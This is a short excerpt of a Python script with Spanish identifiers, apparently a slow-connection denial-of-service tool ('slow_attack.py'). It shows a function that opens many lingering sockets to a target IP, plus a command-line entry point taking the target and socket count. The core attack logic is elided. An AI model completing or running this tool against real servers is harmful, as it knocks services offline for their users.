...
def mantener_sockets_activos(target_ip, count, ciclos=30, intervalo=3):
    lista_sockets = []
    print(f"[*] Abriendo {count} conexiones lentas hacia {target_ip}...")
...
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: python3 slow_attack.py <IP_Destino> <Cantidad_Sockets>")
        sys.exit(1)
    mantener_sockets_activos(sys.argv[1], int(sys.argv[2]), ciclos=4, intervalo=3)
